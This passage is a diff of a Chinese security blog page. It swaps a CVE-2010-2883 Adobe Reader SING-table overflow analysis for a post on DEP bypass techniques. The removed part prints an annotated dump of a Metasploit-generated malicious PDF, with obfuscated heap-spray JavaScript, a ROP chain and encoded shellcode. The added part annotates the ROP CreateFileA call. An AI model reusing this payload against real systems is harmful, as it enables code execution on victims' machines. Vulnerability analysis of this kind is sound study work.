@@ -194,7 +194,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/09/cve-2010-2883/">
+    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/17/cve-2010-2883-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -207,7 +207,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/04/09/cve-2010-2883/" class="post-title-link" itemprop="url">cve-2010-2883</a>
+          <a href="/2021/04/17/cve-2010-2883-2/" class="post-title-link" itemprop="url">cve-2010-2883-2</a>
         </h2>
 
         <div class="post-meta-container">
@@ -219,7 +219,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-04-09 09:19:18 / Modified: 09:19:57" itemprop="dateCreated datePublished" datetime="2021-04-09T09:19:18+08:00">2021-04-09</time>
+      <time title="Created: 2021-04-17 18:31:14 / Modified: 22:06:37" itemprop="dateCreated datePublished" datetime="2021-04-17T18:31:14+08:00">2021-04-17</time>
     </span>
 
   
@@ -232,90 +232,199 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="cankao"><a href="#cankao" class="headerlink" title="cankao"></a>cankao</h2><p><a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
-<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p><strong><code>Adobe Reader</code>**和</strong><code>Acrobat</code><strong>都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的<code>PDF文件阅读器</code>，Acrobat是一款<code>PDF文件编辑和转换工具</code>。基于</strong><code>Window</code><strong>和</strong><code>Mac OS X</code>**的Adobe Reader和Acrobat <code>9.4之前</code>的9.x版本，<code>8.2.5之前</code>的8.x版本的<code>CoolType.dll</code>中存在<code>基于栈的缓冲区溢出漏洞</code>。远程攻击者可借助带有<code>TTF字体</code>Smart INdependent Glyphlets (<code>SING</code>)表格中超长字段<code>uniqueName</code>的PDF文件<code>执行任意代码</code>或者导致<code>拒绝服务</code>（应用程序崩溃）。</p>
-<h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>虚拟机：Windows XP SP3、kali<br>调试软件：OLLYDBG、PdfStreamDumper pdf恶意代码文档分析工具<br>漏洞软件：下载9.3.4版本的acrobat adobe<br>调试文件：msf.pdf   [kali里用metasploit生成的]</p>
-<p>下载链接：<br>【1】windows xp sp3：ed2k://|file|zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso|630239232|CD0900AFA058ACB6345761969CBCBFF4|/</p>
-<p>【2】acrobat adobe9.3.4：<a target="_blank" rel="noopener" href="http://www.oldversion.cn/windows/download/acrobat-reader-9-3-4">http://www.oldversion.cn/windows/download/acrobat-reader-9-3-4</a></p>
-<p>【3】pdf恶意代码文档分析工具：<a target="_blank" rel="noopener" href="http://sandsprite.com/CodeStuff/PDFStreamDumper_Setup.exe">http://sandsprite.com/CodeStuff/PDFStreamDumper_Setup.exe</a></p>
-<p>问题：windows xp sp3下载后出现百度打得开但是网易云或者其他网站打不开，需要ie里下载火狐浏览器。</p>
-<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="pdf文件格式"><a href="#pdf文件格式" class="headerlink" title="pdf文件格式"></a>pdf文件格式</h3><p>   <code>可移植文档格式</code>（Portable Document Format，简称PDF）是一种用独立于应用程序、硬件、操作系统的方式呈现文档的文件格式。1991年，Adobe Systems共同创始人<code>约翰·沃诺克</code>提出的名为<code>“Camelot”</code>的系统演变成<code>PDF</code>。PDF文件格式可以将文字、字型、格式、颜色及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含超文本链接、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都较高。而且这种格式是<code>跨平台</code>的，和操作系统无关。<br>  PDF文档是一种<code>文本</code>和<code>二进制</code>混排的格式，它由以下**<code>四部分组成</code>**：</p>
+          <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>DEP,数据执行保护，其基本原理是将数据所在内存页标识为不可执行。</p>
+<p><img src="https://i.imgur.com/0qqIx33.png"></p>
+<p>主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池执行代码）</p>
+<p>DEP的保护对象是进程级别的，当某个进程的加载模块只要有一个模块不支持DEP，这个进程就不能贸然开启DEP，否则会发生异常。</p>
+<p>Ret2libc：我们让程序跳转到一个已经存在的系统函数中，已经存在的系统函数必然存在于可执行页上，所以此时DEP是不会拦截的，Ret2libc的攻击原理也正是基于此。</p>
+<p>三种比较有效的绕过DEP的exploit方法：</p>
+<ol>
+<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行。</li>
+<li>通过跳转到VirualProtect函数来将shellcode所在内存页设置为可执行状态，然后再转入shellcode执行。</li>
+<li>通过跳转到VirualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到这段内存中执行。</li>
+</ol>
+<h3 id="CreateFileA-功能-创建一个文件或设备"><a href="#CreateFileA-功能-创建一个文件或设备" class="headerlink" title="CreateFileA();功能:创建一个文件或设备"></a>CreateFileA();功能:创建一个文件或设备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C24   4A801064  +-CALL 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName &#x3D; &quot;iso88591&quot;    ; 创建一个名为iso88591的文件。</span><br><span class="line">0C0C0C2C   10000000  | Access &#x3D; GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</span><br><span class="line">0C0C0C30   00000000  | ShareMode &#x3D; 0            ; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span><br><span class="line">0C0C0C34   00000000  | pSecurity &#x3D; NULL         ; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span><br><span class="line">0C0C0C38   00000002  | Mode &#x3D; CREATE_ALWAYS     ; 始终创建一个新文件。</span><br><span class="line">0C0C0C3C   00000102  | Attributes &#x3D; HIDDEN|TEMPORARY    ; 文件属性：隐藏文件|临时文件</span><br><span class="line">0C0C0C40   00000000  +-hTemplateFile &#x3D; NULL     ; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span><br></pre></td></tr></table></figure>
+<p>0C0C0C2C   10000000  | Access = GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</p>
+<p><img src="https://i.imgur.com/INBRrc4.png"></p>
 <blockquote>
-<ul>
-<li>**<code>header</code>**：头部，PDF文件的第一行，用以标识PDF文档的版本。通常格式为%PDF-x.y,PDF版本历经了1.0、1.1、1.2、1.3、1.4、1.5、1.6、1.7、2.0多个版本。</li>
-<li>**<code>body</code>**：PDF的主体部分，包含PDF文档的主题内容，各部分以对象的方式呈现。</li>
-<li>**<code>xref table</code>**：交叉引用表，通过交叉引用表可以快速的找到PDF文档中的各对象。每一个对象在交叉引用表中占据一项。</li>
-<li>**<code>trailer</code>**：PDF文档尾，包含交叉引用的摘要和交叉引用表的起始位置。</li>
-</ul>
+<p>注意是从0开始的，0x10000000转换为二进制就是1000000000000000000000000000，29是1。从0开始就是28.</p>
 </blockquote>
-<p>PDF文档中包含<code>字体对象</code>，而本篇文章所讲述的漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中所包含的<code>SING表</code>的<code>uniqueName字段</code>进行长度校验，导致了<code>栈溢出</code>漏洞的发生。下面是我通过<code>PdfStreamDumper</code>读出来的一些PDF的内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5    &#x2F;&#x2F;此PDF文档符合PDF1.5规范</span><br><span class="line">%84 DA C7 95    </span><br><span class="line"></span><br><span class="line">1 0 obj     &#x2F;&#x2F;对象1</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Pages 2 0 R        </span><br><span class="line">    &#x2F;Type &#x2F;Catalog      &#x2F;&#x2F;此对象是catalog对象</span><br><span class="line">    &#x2F;OpenAction 11 0 R  &#x2F;&#x2F;对象11包含打开PDF时要执行的操作</span><br><span class="line">    &#x2F;AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;MediaBox 3 0 R     &#x2F;&#x2F;对象3包含页面显示的大小</span><br><span class="line">    &#x2F;Resources 4 0 R    &#x2F;&#x2F;对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    &#x2F;Kids [5 0 R]       &#x2F;&#x2F;此对象的孩子为对象5</span><br><span class="line">    &#x2F;Count 1            &#x2F;&#x2F;此PDF总共有1页</span><br><span class="line">    &#x2F;Type &#x2F;Pages        &#x2F;&#x2F;此对象是Pages对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">3 0 obj</span><br><span class="line">    [0 0 595 842]</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Font 6 0 R         &#x2F;&#x2F;对象6包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Parent 2 0 R       &#x2F;&#x2F;此对象的父对象是2</span><br><span class="line">    &#x2F;MediaBox 3 0 R     &#x2F;&#x2F;对象3包含页面显示的大小</span><br><span class="line">    &#x2F;Resources 4 0 R    &#x2F;&#x2F;对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    &#x2F;Contents [8 0 R]   &#x2F;&#x2F;对象8是内容对象</span><br><span class="line">    &#x2F;Type &#x2F;Page         &#x2F;&#x2F;此对象的类型是Page</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">6 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;F1 7 0 R           &#x2F;&#x2F;对象7包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">7 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Type &#x2F;Font         &#x2F;&#x2F;字体对象</span><br><span class="line">  -------------------------------------------------------------------------------</span><br><span class="line">    &#x2F;Subtype &#x2F;TrueType  &#x2F;&#x2F;字体类型是TrueType</span><br><span class="line">    -----------------------------------------------------------------------------</span><br><span class="line">    &#x2F;Name &#x2F;F1</span><br><span class="line">    &#x2F;BaseFont &#x2F;Cinema   &#x2F;&#x2F;基于Cinema字体</span><br><span class="line">    &#x2F;Widths []</span><br><span class="line">    &#x2F;FontDescriptor 9 0 R   &#x2F;&#x2F;对象9是字体描述对象</span><br><span class="line">    &#x2F;Encoding &#x2F;MacRomanEncoding     &#x2F;&#x2F;字符编码采用MacRoman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Length 65</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    0 g</span><br><span class="line">    BT</span><br><span class="line">    &#x2F;F1 32 Tf</span><br><span class="line">    32 Tc</span><br><span class="line">    1 0 0 1 32 773.872 Tm</span><br><span class="line">    (Hello World!) Tj</span><br><span class="line">    ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Type &#x2F;FontDescriptor            &#x2F;&#x2F;此对象为字体描述对象</span><br><span class="line">    &#x2F;FontName &#x2F;Cinema                &#x2F;&#x2F;字体名称是Cinema</span><br><span class="line">    &#x2F;Flags 131140</span><br><span class="line">    &#x2F;FontBBox [-177 -269 1123 866]</span><br><span class="line">    &#x2F;FontFile2 10 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">10 0 obj    &#x2F;&#x2F;字体文件</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Length 40238</span><br><span class="line">    &#x2F;Filter &#x2F;FlateDecode</span><br><span class="line">    &#x2F;Length1 65932</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">                            表目录头</span><br><span class="line">              |    ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣   |</span><br><span class="line">    00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS&#x2F;2 --+</span><br><span class="line">    00000010: B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  ._.c...p...VPCLT   |</span><br><span class="line">    00000020: D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  ..^........6cmap   |</span><br><span class="line">    00000030: A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  .......l...Xcvt    |</span><br><span class="line">    00000040: FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ...9........fpgm   |</span><br><span class="line">    00000050: E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  ......&amp;&#96;....gasp   |</span><br><span class="line">    00000060: 00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  .......H....glyf   |</span><br><span class="line">    00000070: 0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA...&amp;....~hdmx   |</span><br><span class="line">    00000080: 34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4.!........Hhead   |TTF字体表目录项</span><br><span class="line">    00000090: DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  .......T...6hhea   |</span><br><span class="line">    000000a0: 10 45 08 6F 00 00 EB 4C 00 00 00 24 68 6D 74 78  .E.o...L...$hmtx   |</span><br><span class="line">    000000b0: 09 C6 8E B2 00 00 B4 C4 00 00 04 30 6B 65 72 6E  ...........0kern   |</span><br><span class="line">    000000c0: DC 52 D5 99 00 00 BD A0 00 00 2D 8A 6C 6F 63 61  .R........-.loca   |</span><br><span class="line">    000000d0: F3 CB D2 3D 00 00 BB 84 00 00 02 1A 6D 61 78 70  ...&#x3D;........maxp   |</span><br><span class="line">    000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING   |&lt;-SING表，此漏洞相关的表</span><br><span class="line">    000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post   |</span><br><span class="line">    00000100: B4 5A 2F BB 00 00 B8 F4 00 00 02 8E 70 72 65 70  .Z&#x2F;.........prep --+</span><br><span class="line">    00000110: 3B 07 F1 00 00 00 20 F8 00 00 05 68 00 00 01 00  ;..... ....h.... --+</span><br><span class="line">    00000120: 01 0E 00 01 00 00 00 00 00 00 00 3A F1 B9 F1 F4  ...........:....   |</span><br><span class="line">    00000130: 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C AC 86 F7 B5  ub.....J........   |</span><br><span class="line">    00000140: ED 50 17 29 5C 12 8D 01 4E 51 05 0E E7 CC BC CA  .P.)\...NQ......   |</span><br><span class="line">    00000150: 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D DB C2 4B 84  k....6.^E..&#125;..K.   |各个表内容</span><br><span class="line">    00000160: E8 67 8A 92 74 90 C8 3D 03 65 FE 80 4E E7 C7 42  .g..t..&#x3D;.e..N..B   |</span><br><span class="line">    00000170: 89 8B DA 08 91 71 7A 3D 83 8E BD 60 AB 8F FA 53  .....qz&#x3D;...&#96;...S   |</span><br><span class="line">    ...........                                                                   |</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Type &#x2F;Action</span><br><span class="line">    &#x2F;S &#x2F;JavaScript</span><br><span class="line">---------------------------------------------------------------------------------------    </span><br><span class="line">    &#x2F;JS 12 0 R     &#x2F;&#x2F;对象12为包含javascript脚本的对象</span><br><span class="line">----------------------------------------------------------------------------------------    </span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">12 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Length 4245</span><br><span class="line">    &#x2F;Filter [&#x2F;FlateDecode &#x2F;ASCIIHexDecode]</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    var TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ &#x3D; unescape;</span><br><span class="line">    var NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE &#x3D; TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &#39;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf&#39; );</span><br><span class="line">    var cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu &#x3D; TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">    while (cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.length + 20 + 8 &lt; 65536) cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu+&#x3D;cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI &#x3D; cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.substring(0, (0x0c0c-0x24)&#x2F;2);</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI +&#x3D; NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI +&#x3D; cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ &#x3D; KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI.substring(0, 65536&#x2F;2);</span><br><span class="line">    while(LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.length &lt; 0x80000) LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ +&#x3D; LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ;</span><br><span class="line">    uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl &#x3D; LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.substring(0, 0x80000 - (0x1020-0x08) &#x2F; 2);</span><br><span class="line">    var vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW &#x3D; new Array();</span><br><span class="line">    for (BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE&#x3D;0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE&lt;0x1f0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE++) vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW[BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE]&#x3D;uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl+&quot;s&quot;;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">13 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;XFA 14 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">14 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Length 372</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;xdp:xdp 